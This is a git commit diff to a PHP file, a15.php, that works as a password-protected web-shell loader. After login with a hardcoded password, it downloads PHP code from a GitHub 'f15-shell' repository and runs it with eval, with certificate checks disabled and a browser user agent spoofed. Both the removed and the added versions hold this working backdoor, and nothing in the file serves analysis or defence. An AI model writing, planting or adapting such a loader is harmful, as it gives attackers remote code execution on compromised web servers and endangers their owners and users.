b75dcd5b5a15f5e210e30bb2ff6a601a105fef62
fitwilliamx1337 <woemonyet@gmail.com>
2026-01-06 20:30:06 +0700

    Update a15.php

--- a15.php
+++ a15.php
@@ -1,76 +1,40 @@
 <?php
 session_start();
 
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
+function geturl($url) {
     if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
-        }
-
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
+            CURLOPT_SSL_VERIFYPEER => 0,
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_COOKIE => $_SESSION['coki'] ?? ''
+        ]);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
     }
-    return $url_get_contents_data;
+    return @file_get_contents($url) ?: false;
 }
 
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+if ($_POST['password'] ?? '' && md5($_POST['password']) === md5('sipur')) {
+    $_SESSION['logged_in'] = true;
+    $_SESSION['coki'] = '123';
 }
 
-if (isset($_POST['password'])) {
-    $entered_password = $_POST['password'];
-
-    $hashed_password = md5('sipur');
-
-    if (md5($entered_password) === $hashed_password) {
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = '123';
-    } else {
-        echo " ";
-    }
+if ($_SESSION['logged_in'] ?? false) {
+    eval('?>' . geturl('https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/f15.php'));
+    exit;
 }
-
-if (is_logged_in()) {
-
-    $a = geturlsinfo('https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/f15.php');
-
-    eval('?>' . $a);
-} else {
 ?>
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Login</title>
-</head>
+<head><title>Login</title></head>
 <body>
-    <form method="POST" action="">
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password">
-        <input type="submit" value="Login">
-    </form>
+    <form method="POST"><label>Password:</label>
+    <input type="password" name="password">
+    <input type="submit" value="Login"></form>
 </body>
 </html>
-<?php
-}
-?>
